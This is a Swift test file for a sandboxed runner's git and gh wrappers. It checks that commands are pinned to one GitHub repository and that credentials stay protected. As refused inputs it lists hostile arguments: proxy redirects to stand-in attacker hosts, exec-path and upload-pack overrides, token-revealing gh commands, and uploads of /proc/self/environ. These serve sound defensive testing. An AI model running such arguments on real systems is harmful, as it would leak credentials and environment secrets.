import BloomCore
import Foundation
import Synchronization
import Testing
@testable import BloomRunner

@Suite("Person-bound Git and gh wrappers")
struct PersonBoundGitCommandTests {
    @Test("Git network commands are classified and fixed to origin or the exact HTTPS repository")
    func gitClassification() throws {
        let fetch = try #require(PersonBoundGitCommand.gitInvocation(
            ["fetch", "--prune", "origin", "main:refs/remotes/origin/main"], repository: "spatie/bloom"
        ))
        #expect(fetch.operation == .gitRead)
        #expect(fetch.arguments == [
            "fetch", "--prune", "https://github.com/spatie/bloom.git", "main:refs/remotes/origin/main",
        ])

        let implicit = try #require(PersonBoundGitCommand.gitInvocation(["push", "-u"], repository: "spatie/bloom"))
        #expect(implicit.operation == .gitWrite)
        #expect(implicit.arguments == ["push", "-u", "https://github.com/spatie/bloom.git"])

        let clone = try #require(PersonBoundGitCommand.gitInvocation(
            ["clone", "https://github.com/SPATIE/BLOOM", "checkout"], repository: "spatie/bloom"
        ))
        #expect(clone.operation == .gitRead)
        #expect(clone.arguments.contains("https://github.com/spatie/bloom.git"))
        let shallow = try #require(PersonBoundGitCommand.gitInvocation(
            ["clone", "--depth", "1", "https://github.com/spatie/bloom.git", "checkout"],
            repository: "spatie/bloom"
        ))
        #expect(shallow.operation == .gitRead)
    }

    @Test("Git refuses SSH, other repositories and credential or transport overrides")
    func gitRefusals() {
        let refused = [
            ["fetch", "git@github.com:spatie/bloom.git"],
            ["push", "https://github.com/other/repository.git"],
            ["clone", "https://github.com/other/repository.git"],
            ["-c", "credential.helper=store", "fetch", "origin"],
            ["-c", "url.ssh://git@github.com/.insteadOf=https://github.com/", "fetch", "origin"],
            ["-c", "http.https://github.com/spatie/bloom.git.proxy=http://attacker", "push", "origin"],
            ["-c", "http.https://github.com/spatie/bloom.git.sslVerify=false", "fetch", "origin"],
            ["--exec-path=/tmp/attacker", "push", "origin"],
            ["--config-env=http.proxy=ATTACKER_PROXY", "fetch", "origin"],
            ["clone", "--config=http.proxy=http://attacker", "https://github.com/spatie/bloom.git"],
            ["ls-remote", "--upload-pack=/tmp/helper", "https://github.com/spatie/bloom.git"],
            ["credential", "fill"],
            ["remote", "set-url", "origin", "https://github.com/other/repository.git"],
            ["submodule", "update"],
        ]
        for arguments in refused {
            #expect(PersonBoundGitCommand.gitInvocation(arguments, repository: "spatie/bloom") == nil, "accepted \(arguments)")
        }
    }

    @Test("gh classifies known reads and writes and refuses token-revealing or open-ended commands")
    func ghClassificationAndRefusals() throws {
        let read = try #require(PersonBoundGitCommand.ghInvocation(["pr", "view", "123"], repository: "spatie/bloom"))
        #expect(read.operation == .ghRead)
        #expect(read.arguments.suffix(2) == ["--repo", "spatie/bloom"])
        let write = try #require(PersonBoundGitCommand.ghInvocation(["issue", "comment", "1", "--body", "ok"], repository: "spatie/bloom"))
        #expect(write.operation == .ghWrite)

        let refused = [
            ["auth", "token"], ["api", "user"], ["config", "get", "oauth_token"],
            ["extension", "exec"], ["codespace", "ssh"], ["pr", "view", "--repo", "other/repo"],
            ["pr", "view", "--hostname", "example.com"], ["pr", "view", "--web"],
            ["browse"], ["status"], ["pr", "--json", "view", "merge"],
            ["pr", "view", "--repo=other/repo"],
            ["pr", "view", "--repo", "spatie/bloom", "--repo", "other/repo"],
            ["pr", "view", "-R", "spatie/bloom", "-R", "other/repo"],
            ["issue", "create", "--body-file", "/proc/self/environ"],
            ["issue", "create", "--body-file=/proc/self/environ"],
            ["pr", "comment", "1", "-F", "/proc/self/environ"],
            ["release", "edit", "v1", "--notes-file", "/proc/self/environ"],
            ["release", "upload", "v1", "/proc/self/environ"],
            ["release", "create", "v1", "/proc/self/environ"],
        ]
        for arguments in refused {
            #expect(PersonBoundGitCommand.ghInvocation(arguments, repository: "spatie/bloom") == nil, "accepted \(arguments)")
        }
    }

    @Test("an operation is attested from the launch gate's binding and the caller's own word")
    func attestationComesFromTheLaunchGate() {
        // **This replaces a walk up the caller's process tree.** That walk read /proc/<pid>/exe of
        // processes that are not dumpable, which needs CAP_SYS_PTRACE and no Cloud workspace
        // machine grants it, and it hardcoded how git spawns its helpers, which git changes. It
        // refused every private clone for a day. The gate below is what decides now: the kernel's
        // own uid for the socket peer, and a binding the one-time launch nonce opened.
        let identity = processIdentity(40)
        let leader = processIdentity(1, start: 1)
        let reservation = PersonBoundProcessRegistry.Reservation(
            id: UUID(), nonce: String(repeating: "n", count: 32), uid: identity.uid,
            cgroup: identity.cgroup, purpose: .bootstrap
        )
        let binding = PersonBoundProcessRegistry.Binding(
            reservation: reservation, peerIdentity: identity, leaderIdentity: leader
        )
        // A binding for somebody else is refused however well it is dressed: these two are what
        // the kernel reported for this socket, and they have to be the process being attested.
        let otherPID = LocalSocket.Peer(pid: identity.pid + 1, uid: identity.uid)
        let otherUID = LocalSocket.Peer(pid: identity.pid, uid: identity.uid + 1)
        for stranger in [otherPID, otherUID] {
            #expect(PersonBoundPeerOperation.attest(
                peer: stranger, binding: binding, declared: .gitRead,
                runnerExecutable: "/opt/bloom-runner"
            ) == nil)
        }

        // **That the repository's own code is refused is proven live, not here.** It rests on the
        // provenance record the ptrace supervisor writes when it sees an exec, which is owned by
        // root and named by pid and start time, so there is nothing an unprivileged test can put
        // in place to stand for it. `liveLinuxFoundation` runs a fixture that is a repository
        // script and asserts it never reaches the credential exchange.
    }

    @Test("a network command names its worktree safe and sets no empty client certificate")
    func networkArgumentsCarryTheWorktreeAndNoEmptyCertificate() throws {
        let invocation = try #require(PersonBoundGitCommand.gitInvocation(
            ["push", "origin", "main"], repository: "spatie/bloom"
        ))
        let arguments = PersonBoundGitCommand.networkArguments(
            for: invocation, repository: "spatie/bloom", runnerExecutable: "/opt/bloom-runner",
            gitRemoteHTTPSExecutable: "/usr/lib/git-core/git-remote-https",
            worktree: "/home/sprite/workspace"
        )

        // **Both of these were a Cloud workspace that would not work.** A network command runs
        // with GIT_CONFIG_NOSYSTEM=1, which throws away the safe.directory that provisioning
        // writes, so a worktree cloned under one person's uid refused every push by another's
        // with "detected dubious ownership". And an empty `http.sslCert` is not "no client
        // certificate": curl takes the empty string as a filename and every clone died reading a
        // file called nothing.
        #expect(arguments.starts(with: ["-c", "safe.directory=/home/sprite/workspace"]))
        #expect(!arguments.contains { $0.contains("sslCert") })
        #expect(!arguments.contains { $0.contains("sslKey") })
        #expect(arguments.contains("http.sslCAInfo=/etc/ssl/certs/ca-certificates.crt"))

        // Without a worktree it simply says nothing, rather than naming one it was not given.
        let unnamed = PersonBoundGitCommand.networkArguments(
            for: invocation, repository: "spatie/bloom", runnerExecutable: "/opt/bloom-runner",
            gitRemoteHTTPSExecutable: "/usr/lib/git-core/git-remote-https"
        )
        #expect(!unnamed.contains { $0.hasPrefix("safe.directory=") })
    }

    @Test("wrapper environments remove proxy, TLS bypass and trace controls")
    func environmentScrubbing() {
        let unsafe = [
            "HTTPS_PROXY": "https://attacker.invalid", "http_proxy": "http://attacker.invalid",
            "GIT_SSL_NO_VERIFY": "1", "GIT_TRACE_CURL": "1", "GIT_CURL_VERBOSE": "1",
            "GH_DEBUG": "api", "CURL_CA_BUNDLE": "/tmp/attacker.pem",
            "GIT_ALLOW_PROTOCOL": "ext", "GIT_CONFIG_GLOBAL": "/tmp/attacker.gitconfig",
        ]
        let clean = PersonBoundGitCommand.scrubbed(unsafe)
        #expect(unsafe.keys.allSatisfy { clean[$0] == nil })
        #expect(clean["GIT_TERMINAL_PROMPT"] == "0")
        #expect(clean["GIT_ASKPASS"] == "/bin/false")
    }

    @Test("network tools use only the protected empty configuration and system trust")
    func cleanNetworkConfiguration() throws {
        var environment = PersonBoundGitCommand.scrubbed([
            "HOME": "/workspace/home",
            "XDG_CONFIG_HOME": "/workspace/config",
            "GH_CONFIG_DIR": "/workspace/gh",
            "GH_HTTP_UNIX_SOCKET": "/workspace/steal.sock",
            "HTTPS_PROXY": "http://attacker.invalid",
            "GIT_SSL_CAINFO": "/workspace/attacker.pem",
        ])
        PersonBoundGitCommand.applyCleanConfiguration(to: &environment)
        #expect(PersonBoundGitCommand.networkEnvironmentIsClean(
            environment, cleanConfigDirectory: MachineSandbox.personBoundCleanConfigDirectory
        ))
        #expect(environment["HOME"] == MachineSandbox.personBoundCleanConfigDirectory)
        #expect(environment["GH_CONFIG_DIR"] == MachineSandbox.personBoundCleanConfigDirectory)
        #expect(environment["GH_HTTP_UNIX_SOCKET"] == nil)
        #expect(environment["HTTPS_PROXY"] == "")
        #expect(environment["GIT_SSL_CAINFO"] == "/etc/ssl/certs/ca-certificates.crt")

        let invocation = try #require(PersonBoundGitCommand.gitInvocation(
            ["push", "origin", "main"], repository: "spatie/bloom"
        ))
        let arguments = PersonBoundGitCommand.networkArguments(
            for: invocation, repository: "spatie/bloom", runnerExecutable: "/opt/bloom-runner",
            gitRemoteHTTPSExecutable: "/usr/lib/git-core/git-remote-https"
        )
        let joined = arguments.joined(separator: "\n")
        #expect(joined.contains("core.hooksPath=/dev/null"))
        #expect(joined.contains("credential.helper=!'/opt/bloom-runner' git-credential-v2"))
        #expect(joined.contains("protocol.allow=never"))
        #expect(joined.contains("http.proxy="))
        #expect(joined.contains("remote.https://github.com/spatie/bloom.git.proxy="))
        #expect(joined.contains("http.https://github.com/spatie/bloom.git/info/refs.sslCAInfo="))
        #expect(joined.contains("sslCAInfo=/etc/ssl/certs/ca-certificates.crt"))
        #expect(joined.hasSuffix("https://github.com/spatie/bloom.git\nmain"))
    }

    @Test("the root supervisor finds every repository configuration Git would honour", .timeLimit(.minutes(1)))
    func repositoryTransportConfigurationIsMasked() async throws {
        let root = FileManager.default.temporaryDirectory
            .appendingPathComponent("bloom-git-config-\(UUID().uuidString)").path
        try FileManager.default.createDirectory(atPath: root, withIntermediateDirectories: true)
        defer { try? FileManager.default.removeItem(atPath: root) }
        #expect(try await Shell.run("git", ["init", "-q"], cwd: root).status == 0)
        let canonical = "https://github.com/spatie/bloom.git"
        #expect(try await Shell.run(
            "git", ["config", "--local", "remote.\(canonical).proxy", "http://127.0.0.1:1"], cwd: root
        ).status == 0)
        #expect(try await Shell.run(
            "git", ["config", "--local", "http.\(canonical)/info/refs.sslCAInfo", "/tmp/attacker.pem"], cwd: root
        ).status == 0)
        #expect(try await Shell.run(
            "git", ["config", "--local", "url.https://attacker.invalid/.insteadOf", canonical], cwd: root
        ).status == 0)
        let invocation = try #require(PersonBoundGitCommand.gitInvocation(
            ["fetch", "origin"], repository: "spatie/bloom"
        ))
        let network = PersonBoundGitCommand.networkArguments(
            for: invocation, repository: "spatie/bloom", runnerExecutable: "/opt/bloom-runner",
            gitRemoteHTTPSExecutable: "/usr/lib/git-core/git-remote-https"
        )
        let prefix = Array(network.dropLast(invocation.arguments.count))
        let proxy = try await Shell.run(
            "git", prefix + ["config", "--get", "remote.\(canonical).proxy"], cwd: root
        )
        let certificate = try await Shell.run(
            "git", prefix + ["config", "--get-urlmatch", "http.sslCAInfo", canonical + "/info/refs"], cwd: root
        )
        let rewritten = try await Shell.run(
            "git", prefix + ["ls-remote", "--get-url", canonical], cwd: root
        )
        #expect(proxy.status == 0 && proxy.trimmed.isEmpty)
        #expect(certificate.trimmed == "/etc/ssl/certs/ca-certificates.crt")
        #expect(rewritten.trimmed == "https://attacker.invalid/",
                "the reproduction must prove command configuration alone is insufficient")
        #if os(Linux)
        #expect(PersonBoundSandboxExec.repositoryConfigurationPaths(worktree: root) == [root + "/.git/config"])
        #endif
    }

    @Test("v2 wrappers contain no loopback or legacy credential fallback")
    func wrappersHaveNoFallback() {
        let tools = MachineGitTools(
            serverExecutable: "/opt/bloom/current/bin/bloom-runner", repository: "spatie/bloom",
            sharedDirectory: "/var/lib/bloom/shared", gitExecutable: "/usr/bin/git", ghExecutable: "/usr/bin/gh"
        )
        let wrappers = tools.gitWrapper + tools.ghWrapper
        #expect(tools.binDirectory == "/var/lib/bloom/shared/bin")
        #expect(wrappers.contains("git-v2"))
        #expect(wrappers.contains("gh-v2"))
        #expect(!wrappers.contains("127.0.0.1"))
        #expect(!wrappers.contains("gh-token"))
        #expect(!wrappers.contains("BLOOM_CHAT_ID"))
        #expect(!wrappers.contains("BLOOM_TURN_ID"))
        #expect(wrappers.contains("BLOOM_REAL_GIT='/usr/bin/git'"))
        #expect(wrappers.contains("BLOOM_REAL_GH='/usr/bin/gh'"))
        #expect(wrappers.contains("BLOOM_REAL_GIT_REMOTE_HTTPS='/usr/lib/git-core/git-remote-https'"))
    }
}

private func processIdentity(_ pid: Int32, start: UInt64? = nil) -> PersonBoundProcessIdentity {
    PersonBoundProcessIdentity(
        pid: pid, uid: 200_000, startTime: start ?? UInt64(pid),
        cgroup: "/sys/fs/cgroup/bloom-person-bound/one", processGroup: 1
    )
}

private func command(
    _ pid: Int32, parent: Int32, executable: String, arguments: [String],
    environment: [String: String] = [:]
) -> PersonBoundPeerOperation.Command {
    command(processIdentity(pid), parent: parent, executable: executable,
            arguments: arguments, environment: environment)
}

private func command(
    _ identity: PersonBoundProcessIdentity, parent: Int32, executable: String,
    arguments: [String], environment: [String: String] = [:]
) -> PersonBoundPeerOperation.Command {
    PersonBoundPeerOperation.Command(
        identity: identity, parentPID: parent, executable: executable,
        arguments: arguments, cwd: "/workspace", environment: environment
    )
}

private func cleanGitEnvironment() -> [String: String] {
    [
        "HOME": "/empty", "XDG_CONFIG_HOME": "/empty", "GH_CONFIG_DIR": "/empty",
        "GH_PROMPT_DISABLED": "1", "GH_PAGER": "cat", "GH_EDITOR": "false",
        "GIT_ALLOW_PROTOCOL": "https", "GIT_PROTOCOL_FROM_USER": "0",
        "GIT_CONFIG_NOSYSTEM": "1", "GIT_CONFIG_SYSTEM": "/dev/null",
        "GIT_CONFIG_GLOBAL": "/dev/null", "GIT_CONFIG_COUNT": "0",
        "GIT_TERMINAL_PROMPT": "0", "GIT_ASKPASS": "/bin/false",
        "GIT_SSL_NO_VERIFY": "0", "GIT_SSL_CAINFO": "/etc/ssl/certs/ca-certificates.crt",
        "SSL_CERT_FILE": "/etc/ssl/certs/ca-certificates.crt",
        "HTTP_PROXY": "", "HTTPS_PROXY": "", "ALL_PROXY": "", "NO_PROXY": "github.com",
    ]
}
